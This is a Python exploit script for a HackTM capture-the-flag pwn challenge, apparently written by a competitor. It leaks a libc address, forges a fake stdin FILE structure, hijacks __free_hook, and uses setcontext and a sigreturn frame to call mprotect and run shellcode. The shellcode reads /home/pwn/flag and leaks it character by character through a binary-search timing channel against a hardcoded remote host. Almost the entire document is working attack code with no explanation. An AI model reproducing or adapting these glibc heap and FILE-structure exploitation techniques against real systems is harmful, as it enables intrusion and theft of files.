#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import string

bin_file = './trip_to_trick_no_nohack'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'138.68.67.161', 'port':20006})
env.set_item('libc',    debug   = None, \
                        local   = 'libc.so.6', \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_system      = libc.sep_function['system']
offset_libc_mov_rdx     = 0x0012be97    # mov rdx, qword [rdi+0x08] ; mov rax, qword [rdi] ; mov rdi, rdx ; jmp rax ;  (1 found)

#==========

def attack(conn, **kwargs):
    ofs, cand, match = kwargs['ofs'], kwargs['cand'], kwargs['match']

    conn.recvuntil('gift : ')
    addr_libc_system = int(conn.recvuntil('\n', drop=True), 16)
    libc.address = addr_libc_system - offset_libc_system
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stdin             = libc.symbols['_IO_2_1_stdin_']
    addr_libc_io_file_jumps     = libc.symbols['_IO_file_jumps']
    addr_libc_io_str_jumps      = addr_libc_io_file_jumps + 0xc0*1

    addr_libc_free_hook         = libc.symbols['__free_hook']

    addr_libc_mov_rdx           = libc.address + offset_libc_mov_rdx
    addr_libc_setcontext        = libc.sep_function['setcontext']
    addr_libc_mprotect          = libc.sep_function['mprotect']

    conn.sendlineafter('1 : ', '{:x} {:x}'.format(addr_libc_stdin+0x38+1, ((addr_libc_stdin-0x200)>>8) | (0xff << 56)))

    fake_stdin  = p64(0xfbad208a)
    fake_stdin += p64(addr_libc_stdin-0x200+0x83)*6
    fake_stdin += p64(addr_libc_stdin + 0xf0)       # -> A
    fake_stdin += p64(addr_libc_stdin&0xff)
    fake_stdin += p64(0)*8
    fake_stdin += p64(addr_libc_stdin-0x10)
    fake_stdin += p64(0)*9
    fake_stdin += p64(addr_libc_io_str_jumps)
    fake_stdin += p64(0xdeadbeef)
    fake_stdin += p64(addr_libc_mov_rdx)

    frame = SigreturnFrame()
    frame.rdi = addr_libc_stdin & ~(0x1000-1)
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rsp = addr_libc_stdin-0x100               # -> B
    frame.rip = addr_libc_mprotect

    shellasm  = shellcraft.open('/home/pwn/flag')
    shellasm += shellcraft.read('rax', addr_libc_stdin+0x100, 0x100)
    shellasm += '''
    mov rsi, {}
    cmp BYTE PTR [rsi], {}
    {} loop
    '''.format(addr_libc_stdin+0x100+ofs, ord(cand), 'jz' if match else 'jle')
    shellasm += shellcraft.exit(0)
    shellasm += 'loop:'
    shellasm += shellcraft.read(0, addr_libc_stdin+0x200, 0x10)
    shellasm += 'jmp loop'

    exploit  = '{:x} {:x}'.format(addr_libc_free_hook, addr_libc_mov_rdx).encode('utf8').ljust(0x1d, b'\x00')
    exploit += bytes(frame)[0x68:0xb0].ljust(0x60, b'\x00')                        # C <-
    exploit += (p64(addr_libc_stdin-0xf8) + asm(shellasm)).ljust(0x100, b'\x00') # B <-
    exploit += fake_stdin.ljust(0xf0, b'\x00')
    exploit += p64(addr_libc_setcontext + 0x35)                                 # A <-
    exploit += p64(addr_libc_stdin - 0x160 - 0x68)                              # -> C

    conn.sendafter('2 : ', exploit[:-1])

    sleep(1)
    conn.sendline('')
    for _ in range(100):
        conn.recv(timeout=0.01)

#==========

if __name__=='__main__':
    #cands = ' !"#$%&\'()*+,-./' + string.digits + string.ascii_uppercase + '_' + string.ascii_lowercase + '{}'
    cands = string.digits + string.ascii_lowercase + '{}'

    comn = Communicate(env.mode, **env.target)
    comn.quiet = True

    #flag = 'HackTM{d747aab3b6d6a95300ebce7e31333973ce5131240e0fa9b849058f27f635e182}' wrong
    flag = 'HackTM{d747aab3b6d6a95300eede7e3337397ace5131240e0fa9b849058f27f635e182}'

    '''
    for i in range(38, len(flag)):
        try:
            print('Testing : {}'.format(flag[i]))
            comn.connect()
            comn.run(attack, ofs = i, cand = flag[i], match = True)
        except:
            print('Wrong! Index : {}'.format(i))
        else:
            pass
    '''

    while True:
        c = cands
        while len(c) > 1:
            low, high = c[:int(len(c)/2)], c[int(len(c)/2):]

            try:
                comn.connect()
                comn.run(attack, ofs = len(flag), cand = low[-1], match = False)
            except:
                c = high
            else:
                c = low

        flag += c
        print(flag)
        if c == '}':
            break

#==========
